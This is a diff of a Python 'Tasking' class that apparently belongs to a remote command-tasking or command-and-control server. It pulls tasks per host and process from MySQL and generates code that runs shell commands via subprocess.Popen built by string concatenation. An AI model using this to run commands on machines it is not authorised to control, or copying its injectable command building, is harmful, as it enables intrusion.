@@ -1,6 +1,5 @@
 import pymysql
-#from core.config import *
-from config import *
+from core.config import *
 
 
 class Tasking(object):
@@ -15,6 +14,7 @@ class Tasking(object):
                                               db=database,
                                               autocommit=True)
 
+        # exception raised during database connection
         except Exception:
             raise
 
@@ -22,6 +22,9 @@ class Tasking(object):
         """
         DESCRIPTION:
             This function closes the database connection
+
+        RETURNS
+            None
         """
         if self.connection.open:
             self.connection.close()
@@ -29,15 +32,12 @@ class Tasking(object):
     def has_tasking(self, hostname, process_id):
         """
         DESCRIPTION:
-            This function queries the "tasks" table for tasking
-
-        ARGUMENTS:
-            str: hostname
-            str: process_id
+            This function queries the "tasks" table to determine if we have tasking
 
         RETURNS:
-            bool: true if tasks, false if no tasks
+            Bool
         """
+        # tries to query the "tasks" table for tasking
         try:
             with self.connection.cursor() as cursor:
                 statement = "SELECT * FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
@@ -51,20 +51,20 @@ class Tasking(object):
                 else:
                     return False
 
+        # exception raised during database query
         except Exception:
             raise
 
     def generate_command_code(self, command):
         """
         DESCRIPTION:
-            This function generates python 2.x code to execute a shell command
-
-        ARGUMENTS:
-            str: command
+            This function generates Python 2.x code to execute a shell command
 
         RETURNS:
-            str: code
+            String
         """
+        # TO DO: add in full Popen() code here
+        # TO DO: query "listeners" table and add in update code
         code = "import subprocess; subprocess.Popen('" + command + "', stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
         return code
 
@@ -73,13 +73,11 @@ class Tasking(object):
         DESCRIPTION:
             This function gets tasking from the "tasks" table
 
-        ARGUMENTS:
-            str: hostname
-            str: process_id
-
         RETURNS:
-
+            **** FILL OUT ****
         """
+        # tries to query "tasks" table for tasking
+        # only one row is returned (if applicable)
         try:
             with self.connection.cursor() as cursor:
                 statement = "SELECT task_action, task_secondary FROM tasks WHERE hostname = %s AND process_id = %s LIMIT 1"
@@ -89,9 +87,6 @@ class Tasking(object):
                 if result[0] == "command":
                     return self.generate_command_code(result[1])
 
+        # exception raised during database query
         except Exception:
             raise
-
-t = Tasking()
-print(t.has_tasking("MINT-TESTING", "90735"))
-print(t.get_tasking("MINT-TESTING", "90735"))
